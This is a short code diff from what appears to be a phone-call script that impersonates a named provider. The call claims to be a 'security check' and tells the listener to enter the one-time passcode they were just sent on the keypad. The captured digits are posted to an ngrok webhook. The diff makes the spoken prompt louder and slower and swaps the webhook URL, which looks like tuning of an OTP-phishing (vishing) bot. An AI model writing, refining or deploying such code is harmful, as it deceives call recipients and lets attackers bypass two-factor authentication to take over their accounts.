@@ -23,7 +23,7 @@ const call = (number, provider) => {
       ncco: [
         {
           action: "talk",
-          text: `this is a security check from ${provider}, we have sent you a message with a one time passcode, please enter the code by dailing the digits on the keypad followed by the hash key in order to verify your account`,
+          text: `<speak><prosody volume='x-loud' rate='slow'><p>this is a security check from ${provider}</p> <p>we have sent you a message with a one time passcode</p> <p>please enter the code by dailing the digits on the keypad followed by the hash key in order to verify your account</p></prosody></speak>`,
         },
         {
           action: "input",
@@ -33,7 +33,7 @@ const call = (number, provider) => {
             maxDigits: 15,
             submitOnHash: true,
           },
-          eventUrl: ["https://4a23-34-68-35-5.ngrok.io/webhooks/dtmf"],
+          eventUrl: ["https://8551-34-68-35-5.ngrok.io/webhooks/dtmf"],
         },
       ],
     },
